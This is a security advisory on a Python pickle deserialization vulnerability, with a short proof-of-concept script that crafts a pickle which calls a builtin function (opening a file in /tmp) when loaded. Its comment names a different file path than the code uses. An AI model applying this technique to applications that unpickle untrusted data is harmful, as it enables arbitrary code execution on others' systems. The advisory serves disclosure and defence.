source: http://www.securityfocus.com/bid/5257/info


Python is an open source, object oriented programming language. The Python Pickle module is provided to convert object variables into a serialized form ("pickling"), and later recover the data back into an object hierarchy ("unpickling").

A vulnerability has been reported in the Pickle implementation included with some versions of Python. If specially crafted malicious object data is "unpickled", it may cause arbitrary Python commands to be executed, including system calls. This is accomplished by specifying an available function as the class constructor.

Exploitation of this vulnerability will be highly dependent on a specific Python application which accepts a pickle string from an untrusted source. This behavior has been reported in some implementations of the Python SmartCookie class.

import pickle, new

def nasty(module, function, *args):
return pickle.dumps(new.classobj(function, (), {
'__getinitargs__': lambda self, arg = args: arg,
'__module__': module
}) ())

# Create the evil pickle
t = nasty("__builtin__", "open", "/tmp/pickle-bug", "w")
# Show the user how it looks
print repr(t)
# Now, load the pickle -- creates the file /tmp/python-is-buggy (by calling
# the builtin open() function, then raises an exception. But the damage is
# done...
pickle.loads(t) 
